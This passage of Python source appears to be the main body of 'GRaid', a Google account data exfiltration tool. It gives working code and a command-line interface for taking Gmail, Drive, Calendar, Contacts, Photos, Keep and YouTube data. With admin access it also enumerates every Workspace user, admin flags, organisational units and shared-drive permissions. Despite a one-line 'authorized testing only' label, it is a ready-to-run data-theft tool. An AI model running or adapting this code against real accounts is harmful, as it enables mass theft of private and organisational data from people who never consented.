            with open(shared_drives_dir / 'shared_drives_list.json', 'w') as f:
                json.dump(shared_drives, f, indent=2)
            print(f"[+] Total accessible Shared Drives: {len(shared_drives)}")
            
            # If admin, try to list ALL Shared Drives
            if self.is_admin:
                try:
                    print("[+] Admin access detected - enumerating ALL Shared Drives...")
                    all_drives = []
                    page_token = None
                    
                    while True:
                        results = self.services['drive'].drives().list(
                            pageSize=100,
                            useDomainAdminAccess=True,
                            pageToken=page_token
                        ).execute()
                        
                        drives = results.get('drives', [])
                        all_drives.extend(drives)
                        page_token = results.get('nextPageToken')
                        
                        if not page_token:
                            break
                    
                    with open(shared_drives_dir / 'all_org_shared_drives.json', 'w') as f:
                        json.dump(all_drives, f, indent=2)
                    print(f"[+] Total Shared Drives in organization: {len(all_drives)}")
                except Exception as e:
                    print(f"[-] Admin access to all Shared Drives failed: {e}")
            
            # Get permissions for each accessible Shared Drive
            print("[+] Retrieving Shared Drive permissions...")
            drive_permissions = {}
            
            for idx, drive in enumerate(shared_drives[:20]):  # Limit to 20 for demo
                drive_id = drive['id']
                drive_name = drive['name']
                
                try:
                    permissions = []
                    page_token = None
                    
                    while True:
                        results = self.services['drive'].permissions().list(
                            fileId=drive_id,
                            supportsAllDrives=True,
                            fields='*',
                            pageToken=page_token
                        ).execute()
                        
                        permissions.extend(results.get('permissions', []))
                        page_token = results.get('nextPageToken')
                        
                        if not page_token:
                            break
                    
                    drive_permissions[drive_name] = {
                        'drive_id': drive_id,
                        'permissions': permissions,
                        'member_count': len(permissions)
                    }
                    
                    if (idx + 1) % 5 == 0:
                        print(f"[+] Processed {idx + 1}/{min(20, len(shared_drives))} Shared Drives")
                except Exception as e:
                    print(f"[-] Error getting permissions for {drive_name}: {e}")
            
            with open(shared_drives_dir / 'shared_drive_permissions.json', 'w') as f:
                json.dump(drive_permissions, f, indent=2)
            
            print(f"[+] Shared Drives exfiltration complete")
            
        except Exception as e:
            print(f"[-] Error in Shared Drives exfiltration: {e}")
    
    def exfiltrate_workspace_admin_data(self):
        """Exfiltrate admin-level Workspace data (requires admin privileges)"""
        print("\n[*] Starting Workspace Admin Data exfiltration...")
        admin_dir = self.output_dir / 'workspace_admin'
        admin_dir.mkdir(exist_ok=True)
        
        if not self.is_admin:
            print("[!] Not an admin account - skipping admin enumeration")
            print("[!] This feature requires super admin or delegated admin privileges")
            return
        
        try:
            # Get all users in the domain
            print("[+] Enumerating all users in domain...")
            all_users = []
            page_token = None
            
            while True:
                try:
                    results = self.services['admin_directory'].users().list(
                        customer='my_customer',
                        maxResults=500,
                        orderBy='email',
                        pageToken=page_token
                    ).execute()
                    
                    users = results.get('users', [])
                    all_users.extend(users)
                    page_token = results.get('nextPageToken')
                    
                    if not page_token:
                        break
                    print(f"[+] Retrieved {len(all_users)} users so far...")
                except Exception as e:
                    print(f"[-] Error listing users: {e}")
                    break
            
            with open(admin_dir / 'all_users.json', 'w') as f:
                json.dump(all_users, f, indent=2)
            print(f"[+] Total users in domain: {len(all_users)}")
            
            # Get organizational units
            print("[+] Retrieving organizational structure...")
            try:
                orgunits = self.services['admin_directory'].orgunits().list(
                    customerId='my_customer',
                    type='all'
                ).execute()
                
                with open(admin_dir / 'organizational_units.json', 'w') as f:
                    json.dump(orgunits, f, indent=2)
                print(f"[+] Retrieved organizational units")
            except Exception as e:
                print(f"[-] Error getting org units: {e}")
            
            # Get domains
            print("[+] Retrieving domain information...")
            try:
                domains = self.services['admin_directory'].domains().list(
                    customer='my_customer'
                ).execute()
                
                with open(admin_dir / 'domains.json', 'w') as f:
                    json.dump(domains, f, indent=2)
                print(f"[+] Retrieved domain information")
            except Exception as e:
                print(f"[-] Error getting domains: {e}")
            
            # Create user summary report
            print("[+] Creating user summary report...")
            user_summary = []
            for user in all_users:
                summary = {
                    'email': user.get('primaryEmail'),
                    'name': user.get('name', {}).get('fullName'),
                    'is_admin': user.get('isAdmin', False),
                    'is_delegated_admin': user.get('isDelegatedAdmin', False),
                    'suspended': user.get('suspended', False),
                    'org_unit_path': user.get('orgUnitPath'),
                    'creation_time': user.get('creationTime'),
                    'last_login_time': user.get('lastLoginTime'),
                }
                user_summary.append(summary)
            
            with open(admin_dir / 'user_summary.json', 'w') as f:
                json.dump(user_summary, f, indent=2)
            
            # Count admins
            admin_count = sum(1 for u in user_summary if u['is_admin'])
            print(f"[+] Found {admin_count} admin users")
            
            print(f"[+] Workspace Admin Data exfiltration complete")
            print(f"[!] WARNING: This data contains highly sensitive organizational information")
            
        except Exception as e:
            print(f"[-] Error in Workspace Admin Data exfiltration: {e}")
            print(f"[!] Ensure the account has Super Admin or appropriate delegated admin privileges")
    
    def exfiltrate_all(self):
        """Run all exfiltration methods"""
        print("\n" + "="*60)
        print("Starting complete data exfiltration")
        print("="*60)
        
        self.exfiltrate_gmail()
        self.exfiltrate_drive()
        self.exfiltrate_calendar()
        self.exfiltrate_contacts()
        self.exfiltrate_photos()
        self.exfiltrate_tasks()
        self.exfiltrate_keep()
        self.exfiltrate_youtube()
        self.check_password_manager()
        
        # Workspace-specific exfiltration
        if self.is_workspace:
            self.exfiltrate_workspace_groups()
            self.exfiltrate_workspace_shared_drives()
            if self.is_admin:
                self.exfiltrate_workspace_admin_data()
        
        print("\n" + "="*60)
        print(f"Exfiltration complete! Data saved to: {self.output_dir}")
        print("="*60)
    
    def exfiltrate_active_only(self):
        """Probe services and only exfiltrate from active ones"""
        active_services = self.probe_active_services()
        
        print("\n" + "="*60)
        print("Starting targeted exfiltration (active services only)")
        print("="*60)
        
        exfil_map = {
            'gmail': self.exfiltrate_gmail,
            'drive': self.exfiltrate_drive,
            'calendar': self.exfiltrate_calendar,
            'contacts': self.exfiltrate_contacts,
            'photos': self.exfiltrate_photos,
            'tasks': self.exfiltrate_tasks,
            'keep': self.exfiltrate_keep,
            'youtube': self.exfiltrate_youtube,
            'workspace_groups': self.exfiltrate_workspace_groups,
            'workspace_shared_drives': self.exfiltrate_workspace_shared_drives,
            'workspace_admin': self.exfiltrate_workspace_admin_data,
            'passwords': self.check_password_manager
        }
        
        for service, info in active_services.items():
            if info.get('active'):
                print(f"\n[*] Exfiltrating {service.upper()}...")
                try:
                    exfil_map[service]()
                except Exception as e:
                    print(f"[-] Error during {service} exfiltration: {e}")
        
        print("\n" + "="*60)
        print(f"Targeted exfiltration complete! Data saved to: {self.output_dir}")
        print("="*60)
    
    def exfiltrate_interactive(self):
        """Probe services, then let user choose what to exfiltrate"""
        active_services = self.probe_active_services()
        
        # Filter to only active services
        available = {k: v for k, v in active_services.items() if v.get('active')}
        
        if not available:
            print("\n[!] No active services found. Nothing to exfiltrate.")
            return
        
        print("\n" + "="*60)
        print("Interactive Selection Mode")
        print("="*60)
        print("\nAvailable services for exfiltration:")
        
        service_list = list(available.keys())
        for idx, service in enumerate(service_list, 1):
            info = available[service]
            details = []
            
            if service == 'gmail':
                details.append(f"{info.get('messages', 0)} messages")
            elif service == 'drive':
                details.append("Files available")
            elif service == 'calendar':
                details.append(f"{info.get('events', 0)} events")
            elif service == 'contacts':
                details.append(f"{info.get('total', 0)} contacts")
            elif service == 'youtube':
                details.append(f"Channel: {info.get('channel_name', 'N/A')}")
            
            detail_str = ', '.join(details) if details else "Available"
            print(f"  {idx}. {service.upper()} ({detail_str})")
        
        print(f"  {len(service_list) + 1}. ALL active services")
        print("  0. Cancel")
        
        # Get user selection
        print("\nEnter your choices (comma-separated numbers, e.g., '1,3,5' or 'all'):")
        try:
            user_input = input("> ").strip().lower()
            
            if user_input == '0' or user_input == 'cancel':
                print("[!] Exfiltration cancelled.")
                return
            
            selected_services = []
            
            if user_input == 'all' or user_input == str(len(service_list) + 1):
                selected_services = service_list
            else:
                choices = [int(x.strip()) for x in user_input.split(',')]
                for choice in choices:
                    if 1 <= choice <= len(service_list):
                        selected_services.append(service_list[choice - 1])
                    else:
                        print(f"[!] Invalid choice: {choice}")
            
            if not selected_services:
                print("[!] No valid services selected. Exiting.")
                return
            
            # Confirm selection
            print(f"\n[*] Selected services: {', '.join([s.upper() for s in selected_services])}")
            confirm = input("Proceed with exfiltration? (y/n): ").strip().lower()
            
            if confirm not in ['y', 'yes']:
                print("[!] Exfiltration cancelled.")
                return
            
            # Execute exfiltration
            print("\n" + "="*60)
            print("Starting exfiltration of selected services")
            print("="*60)
            
            exfil_map = {
                'gmail': self.exfiltrate_gmail,
                'drive': self.exfiltrate_drive,
                'calendar': self.exfiltrate_calendar,
                'contacts': self.exfiltrate_contacts,
                'photos': self.exfiltrate_photos,
                'tasks': self.exfiltrate_tasks,
                'keep': self.exfiltrate_keep,
                'youtube': self.exfiltrate_youtube,
                'workspace_groups': self.exfiltrate_workspace_groups,
                'workspace_shared_drives': self.exfiltrate_workspace_shared_drives,
                'workspace_admin': self.exfiltrate_workspace_admin_data,
                'passwords': self.check_password_manager
            }
            
            for service in selected_services:
                print(f"\n[*] Exfiltrating {service.upper()}...")
                try:
                    exfil_map[service]()
                except Exception as e:
                    print(f"[-] Error during {service} exfiltration: {e}")
            
            print("\n" + "="*60)
            print(f"Exfiltration complete! Data saved to: {self.output_dir}")
            print("="*60)
            
        except (KeyboardInterrupt, EOFError):
            print("\n[!] Exfiltration cancelled by user.")
        except Exception as e:
            print(f"[-] Error in interactive mode: {e}")


def main():
    parser = argparse.ArgumentParser(
        description='GRaid - Google Account Data Exfiltration Tool - For authorized testing only',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --interactive            # Probe, then choose what to exfiltrate (RECOMMENDED)
  %(prog)s -i                       # Short form of --interactive
  %(prog)s --passwords              # Check Password Manager and get export instructions
  %(prog)s --active-only            # Probe then exfil ALL active services
  %(prog)s --probe                  # Only probe, don't exfiltrate (reconnaissance)
  %(prog)s --all                    # Exfiltrate all services (may hit errors)
  %(prog)s --gmail --drive          # Exfiltrate specific services
  %(prog)s --output /tmp/data       # Custom output directory
        """
    )
    
    parser.add_argument('--credentials', default='credentials.json',
                       help='Path to OAuth credentials file (default: credentials.json)')
    parser.add_argument('--output', default='exfiltrated_data',
                       help='Output directory for exfiltrated data (default: exfiltrated_data)')
    parser.add_argument('--probe', action='store_true',
                       help='Only probe services without exfiltrating (reconnaissance mode)')
    parser.add_argument('--all', action='store_true',
                       help='Exfiltrate all data sources')
    parser.add_argument('--active-only', action='store_true',
                       help='Probe first, then only exfiltrate from active services (recommended)')
    parser.add_argument('--interactive', '-i', action='store_true',
                       help='Probe and interactively choose which services to exfiltrate')
    parser.add_argument('--gmail', action='store_true',
                       help='Exfiltrate Gmail data')
    parser.add_argument('--drive', action='store_true',
                       help='Exfiltrate Google Drive data')
    parser.add_argument('--calendar', action='store_true',
                       help='Exfiltrate Google Calendar data')
    parser.add_argument('--contacts', action='store_true',
                       help='Exfiltrate Google Contacts data')
    parser.add_argument('--photos', action='store_true',
                       help='Exfiltrate Google Photos data')
    parser.add_argument('--tasks', action='store_true',
                       help='Exfiltrate Google Tasks data')
    parser.add_argument('--keep', action='store_true',
                       help='Exfiltrate Google Keep notes')
    parser.add_argument('--youtube', action='store_true',
                       help='Exfiltrate YouTube data (subscriptions, playlists, likes)')
    parser.add_argument('--workspace', action='store_true',
                       help='Exfiltrate Workspace data (groups, shared drives)')
    parser.add_argument('--workspace-admin', action='store_true',
                       help='Exfiltrate admin-level Workspace data (requires admin privileges)')
    parser.add_argument('--passwords', action='store_true',
                       help='Display Google Password Manager URL')
    
    # Limit controls
    parser.add_argument('--limit-emails', type=int, default=100,
                       help='Max emails to download (default: 100, 0 = unlimited)')
    parser.add_argument('--limit-files', type=int, default=50,
                       help='Max Drive files to download (default: 50, 0 = unlimited)')
    parser.add_argument('--limit-photos', type=int, default=50,
                       help='Max photos to download (default: 50, 0 = unlimited)')
    parser.add_argument('--limit-events', type=int, default=1000,
                       help='Max calendar events per calendar (default: 1000, 0 = unlimited)')
    parser.add_argument('--limit-contacts', type=int, default=0,
                       help='Max contacts to retrieve (default: 0 = unlimited)')
    parser.add_argument('--limit-notes', type=int, default=100,
                       help='Max Keep notes (default: 100, 0 = unlimited)')
    parser.add_argument('--limit-videos', type=int, default=500,
                       help='Max YouTube liked videos (default: 500, 0 = unlimited)')
    parser.add_argument('--no-limits', action='store_true',
                       help='Remove all limits (download everything - may take hours)')
    
    args = parser.parse_args()
    
    # Show banner
    banner = """
┌──────────────────────────────────────┐
   _____ _____            _____ _____   
  / ____|  __ \     /\   |_   _|  __ \   
 | |  __| |__) |   /  \    | | | |  | | 
 | | |_ |  _  /   / /\ \   | | | |  | | 
 | |__| | | \ \  / ____ \ _| |_| |__| | 
  \_____|_|  \_\/_/    \_\_____|_____/  
└──────────────────────────────────────┘
               G R A I D
 ──────────────────────────────────────
                                       
  Google Account Data Exfiltration Tool
     """
    print(banner)
    
    # Set up limits
    if args.no_limits:
        print("[!] WARNING: Running with no limits - this may take hours and use significant bandwidth!")
        limits = {key: None for key in ['gmail_messages', 'drive_files', 'calendar_events', 
                                          'contacts', 'photos', 'keep_notes', 'youtube_videos']}
    else:
        limits = {
            'gmail_messages': args.limit_emails if args.limit_emails > 0 else None,
            'drive_files': args.limit_files if args.limit_files > 0 else None,
            'calendar_events': args.limit_events if args.limit_events > 0 else None,
            'contacts': args.limit_contacts if args.limit_contacts > 0 else None,
            'photos': args.limit_photos if args.limit_photos > 0 else None,
            'keep_notes': args.limit_notes if args.limit_notes > 0 else None,
            'youtube_videos': args.limit_videos if args.limit_videos > 0 else None,
        }
    
    # Initialize exfiltrator
    exfiltrator = GoogleDataExfiltrator(output_dir=args.output, limits=limits)
    
    # Authenticate
    if not exfiltrator.authenticate(args.credentials):
        return 1
    
    # Initialize services
    if not exfiltrator.initialize_services():
        return 1
    
    # Probe-only mode
    if args.probe:
        exfiltrator.probe_active_services()
        return 0
    
    # Run exfiltration based on arguments
    if args.interactive:
        exfiltrator.exfiltrate_interactive()
    elif args.active_only:
        exfiltrator.exfiltrate_active_only()
    elif args.all:
        exfiltrator.exfiltrate_all()
    else:
        if args.gmail:
            exfiltrator.exfiltrate_gmail()
        if args.drive:
            exfiltrator.exfiltrate_drive()
        if args.calendar:
            exfiltrator.exfiltrate_calendar()
        if args.contacts:
            exfiltrator.exfiltrate_contacts()
        if args.photos:
            exfiltrator.exfiltrate_photos()
        if args.tasks:
            exfiltrator.exfiltrate_tasks()
        if args.keep:
            exfiltrator.exfiltrate_keep()
        if args.youtube:
            exfiltrator.exfiltrate_youtube()
        if args.workspace:
            exfiltrator.exfiltrate_workspace_groups()
            exfiltrator.exfiltrate_workspace_shared_drives()
        if args.workspace_admin:
            exfiltrator.exfiltrate_workspace_admin_data()
        if args.passwords:
            exfiltrator.check_password_manager()
        
        if not any([args.gmail, args.drive, args.calendar, args.contacts, 
                   args.photos, args.tasks, args.keep, args.youtube,
                   args.workspace, args.workspace_admin, args.passwords]):
            print("No exfiltration method specified. Use --active-only, --all, or specify individual methods.")
            parser.print_help()
            return 1
    
    return 0


if __name__ == '__main__':
    exit(main())
